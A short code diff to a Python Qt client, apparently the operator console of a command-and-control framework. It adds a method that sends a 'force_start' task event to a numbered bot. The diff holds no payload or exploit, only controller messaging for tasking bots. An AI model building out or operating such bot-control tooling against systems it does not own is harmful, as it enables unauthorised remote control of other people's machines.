@@ -4,7 +4,7 @@ from QtPyNetwork.client import QThreadedClient
 
 
 class GUIClient(QThreadedClient):
-    """C2 server."""
+    """C2 client."""
 
     def __init__(self):
         super(GUIClient, self).__init__(loggerName=self.__class__.__name__)
@@ -15,6 +15,13 @@ class GUIClient(QThreadedClient):
                     "bot_id": bot_id,
                     "task_id": task_id,
                     "event": "stop"})
+
+    @Slot(int, int)
+    def force_start_task(self, bot_id, task_id):
+        self.write({"event_type": "task",
+                    "bot_id": bot_id,
+                    "task_id": task_id,
+                    "event": "force_start"})
 
     @Slot(int, str, dict, int)
     def send_task(self, bot_id, task, kwargs, user_activity):
